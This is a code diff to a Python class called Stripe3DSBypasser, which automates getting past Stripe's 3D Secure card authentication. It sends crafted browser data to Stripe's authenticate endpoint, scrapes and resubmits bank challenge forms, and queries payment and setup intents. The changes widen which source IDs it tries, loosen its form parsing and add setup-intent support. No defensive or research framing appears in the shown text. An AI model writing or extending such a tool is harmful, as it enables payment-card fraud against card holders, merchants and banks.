@@ -85,9 +85,15 @@ class Stripe3DSBypasser:
             "browserUserAgent": UA,
         }
         auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
+        source_id = (
+            sdk_data.get('three_d_secure_2_source') or
+            sdk_data.get('source') or
+            sdk_data.get('three_ds_2_intent_id') or
+            sdk_data.get('id')
+        )
         auth_body = {
             "key": pk_key,
-            "source": three_ds_2_intent_id or pi_id,
+            "source": source_id or pi_id,
             "client_secret": client_secret,
             "three_ds_2_response": json.dumps(browser_info),
             "browser": json.dumps(browser_info),
@@ -159,9 +165,12 @@ class Stripe3DSBypasser:
             if form_match:
                 acs_url = form_match.group(1)
 
-            for input_match in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', html, re.I):
-                name, val = input_match.group(1), input_match.group(2)
-                form_data[name] = val
+            for input_match in re.finditer(r'<input[^>]+>', html, re.I):
+                tag = input_match.group(0)
+                n_match = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
+                v_match = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
+                if n_match:
+                    form_data[n_match.group(1)] = v_match.group(1) if v_match else ""
 
             # Also check for CReq / PaReq in URL or script
             if not acs_url:
@@ -189,8 +198,12 @@ class Stripe3DSBypasser:
                     if c_form_match:
                         c_url = c_form_match.group(1)
                         c_data = {}
-                        for m in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', acs_html, re.I):
-                            c_data[m.group(1)] = m.group(2)
+                        for input_match in re.finditer(r'<input[^>]+>', acs_html, re.I):
+                            tag = input_match.group(0)
+                            n_match = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
+                            v_match = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
+                            if n_match:
+                                c_data[n_match.group(1)] = v_match.group(1) if v_match else ""
                         if c_data:
                             async with session.post(
                                 c_url, data=urlencode(c_data),
@@ -213,7 +226,8 @@ class Stripe3DSBypasser:
         if not pi_id or not client_secret:
             return None
 
-        url = f"https://api.stripe.com/v1/payment_intents/{pi_id}?client_secret={client_secret}&key={pk_key}"
+        endpoint = "setup_intents" if "seti_" in pi_id else "payment_intents"
+        url = f"https://api.stripe.com/v1/{endpoint}/{pi_id}?client_secret={client_secret}&key={pk_key}"
         hdr = {
             "User-Agent": UA,
             "Accept": "application/json",
